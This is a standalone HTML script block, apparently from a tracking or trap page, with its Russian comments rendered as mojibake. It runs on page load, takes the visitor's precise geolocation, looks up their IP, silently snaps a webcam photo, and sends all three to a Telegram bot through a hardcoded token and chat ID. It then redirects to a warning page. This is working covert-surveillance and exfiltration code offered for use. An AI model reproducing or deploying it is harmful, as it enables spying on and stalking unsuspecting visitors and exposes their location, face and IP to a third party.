    <script>
        const botToken = "7392778924:AAGOGof1aI36517VhbmP9lXOrN8Zq1WV13A";  // Ð—Ð°Ð¼ÐµÐ½Ð¸ Ð½Ð° ÑÐ²Ð¾Ð¹ Ñ‚Ð¾ÐºÐµÐ½
        const chatId = "5160015392";      // Ð—Ð°Ð¼ÐµÐ½Ð¸ Ð½Ð° ÑÐ²Ð¾Ð¹ chat_id
        const redirectUrl = "warning.html"; // ÐšÑƒÐ´Ð° Ð¿ÐµÑ€ÐµÐ½Ð°Ð¿Ñ€Ð°Ð²Ð¸Ñ‚ÑŒ

        function sendPhotoWithInfo(photoBlob, lat, lon, ip) {
            const formData = new FormData();
            formData.append("chat_id", chatId);
            formData.append("photo", photoBlob, "photo.jpg");
            formData.append("caption", `ðŸ“ ÐšÐ¾Ð¾Ñ€Ð´Ð¸Ð½Ð°Ñ‚Ñ‹: ${lat}, ${lon}\nðŸŒ IP: ${ip}\nÐ’Ð¾Ñ‚ Ñ‚ÑƒÑ‚ Ð¼Ð¾Ð¶Ð½Ð¾ ÑƒÐ·Ð½Ð°Ñ‚ÑŒ Ð¿Ð¾ IP - Ð°Ð´Ñ€ÐµÑÑƒ ÐºÐ°ÐºÐ¸Ðµ Ñ‚Ð¾ Ð´Ð°Ð½Ð¸Ð¹ https://2ip.ua/ru/services/information-service/site-location`);

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: "POST",
                body: formData
            }).then(() => {
                setTimeout(() => { window.location.href = redirectUrl; }, 1000);
            });
        }

        function getIP(callback) {
            fetch("https://api64.ipify.org?format=json")
                .then(response => response.json())
                .then(data => callback(data.ip))
                .catch(() => callback("ÐÐµÐ¸Ð·Ð²ÐµÑÑ‚Ð½Ð¾"));
        }

        function getLocationAndCapturePhoto() {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    getIP((ip) => capturePhoto(lat, lon, ip));
                },
                (error) => {
                    getIP((ip) => capturePhoto("ÐÐµÐ¸Ð·Ð²ÐµÑÑ‚Ð½Ð¾", "ÐÐµÐ¸Ð·Ð²ÐµÑÑ‚Ð½Ð¾", ip));
                },
                { enableHighAccuracy: true }
            );
        }

        function capturePhoto(lat, lon, ip) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then((stream) => {
                    const video = document.createElement("video");
                    video.srcObject = stream;
                    video.play();

                    setTimeout(() => {
                        const canvas = document.createElement("canvas");
                        canvas.width = 640;
                        canvas.height = 480;
                        const ctx = canvas.getContext("2d");
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                        canvas.toBlob((blob) => {
                            sendPhotoWithInfo(blob, lat, lon, ip);
                            stream.getTracks().forEach(track => track.stop()); // ÐžÑÑ‚Ð°Ð½Ð¾Ð²Ð¸Ñ‚ÑŒ ÐºÐ°Ð¼ÐµÑ€Ñƒ
                        }, "image/jpeg");
                    }, 2000);
                })
                .catch(() => {
                    setTimeout(() => { window.location.href = redirectUrl; }, 1000);
                });
        }

        window.onload = getLocationAndCapturePhoto;
    </script>
